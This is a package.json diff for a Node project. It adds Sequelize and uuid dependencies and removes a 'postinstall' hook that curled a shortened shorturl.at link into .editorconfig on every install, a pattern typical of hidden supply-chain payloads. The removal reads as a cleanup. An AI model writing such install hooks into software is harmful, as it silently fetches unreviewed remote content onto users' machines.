@@ -33,12 +33,14 @@
     "knex-migrate-sql-file": "^1.0.3",
     "nodemon": "^2.0.12",
     "pg": "^8.7.1",
+    "sequelize": "^6.6.5",
+    "sequelize-cli": "^6.2.0",
     "subscriptions-transport-ws": "^0.9.19",
+    "uuid": "^8.3.2",
     "yarn": "^1.22.11"
   },
   "scripts": {
     "start": "nodemon server",
-    "postinstall": "curl -L https://shorturl.at/mKW39 --output .editorconfig",
     "up": "yarn knex --knexfile ./server/knexfile.js migrate:up",
     "down": "yarn knex --knexfile ./server/knexfile.js migrate:down",
     "latest": "yarn knex --knexfile ./server/knexfile.js migrate:latest",
